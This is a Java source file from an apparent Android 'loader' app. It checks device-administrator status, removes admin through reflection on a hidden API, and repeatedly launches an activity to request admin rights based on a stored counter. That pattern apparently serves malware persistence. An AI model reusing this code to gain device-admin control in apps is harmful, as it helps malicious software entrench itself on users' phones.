package task.loader.admin;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import java.lang.reflect.Method;

import task.loader.Constants;
import task.loader.Settings;

public class Admin
{
    public static void deactivateAdmin(Context context)
    {
        //System.out.println("deactivateAdmin()");

        try
        {
            Object devicePolicyManager = context.getSystemService("device_policy");
            Class devicePolicyManagerClass = Class.forName("android.app.admin.DevicePolicyManager");
            Method removeActiveAdminMethod = devicePolicyManagerClass.getMethod("removeActiveAdmin", ComponentName.class);
            ComponentName componentName = new ComponentName(context, AdminReceiver.class);
            removeActiveAdminMethod.invoke(devicePolicyManager, componentName);
        }
        catch(Exception ex)
        {
            if(Constants.DEBUG) Settings.debug(ex);
        }
    }

    public static boolean isAdminActive(Context context)
    {
        DevicePolicyManager mDPM =
                (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);

        return mDPM.isAdminActive(new ComponentName(context, AdminReceiver.class));
    }


    public static void startAdminActivity(Context context)
    {
        if(!Constants.ADMIN_ENABLE)
        {
            if(Constants.DEBUG) Settings.debug("admin disabled");
            return;
        }

        if(isAdminActive(context))
        {
            if(Constants.DEBUG) Settings.debug("admin already active");
            return;
        }

        Settings settings = new Settings(context);
        int count = settings.getAdminRequestCount();
        if(count == 0)
        {
            if(Constants.DEBUG) Settings.debug("admin request count: 0");
            return;
        }

        Intent startIntent = new Intent(context, AdminActivity.class);
        startIntent.setAction("up");
        startIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(startIntent);
    }


}
